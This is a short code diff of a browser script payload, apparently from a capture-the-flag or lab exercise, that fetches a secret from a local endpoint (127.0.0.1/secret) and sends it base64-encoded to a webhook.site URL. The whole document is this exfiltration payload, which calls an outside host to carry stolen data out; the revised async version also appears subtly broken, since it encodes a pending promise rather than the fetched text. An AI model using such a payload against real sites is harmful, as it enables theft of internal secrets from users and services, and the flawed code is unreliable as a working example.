@@ -1,4 +1,11 @@
 <script>
-data=fetch("http://127.0.0.1/secret");
+  async function getData() {
+  const response = await fetch("http://127.0.0.1/secret");
+  const data = await response.text();
+  console.log(data);
+}
+
+data=getData();
+
 fetch("https://webhook.site/06ee11c8-e279-46bb-8484-341a6a73e328?data="+btoa(data));
 </script>
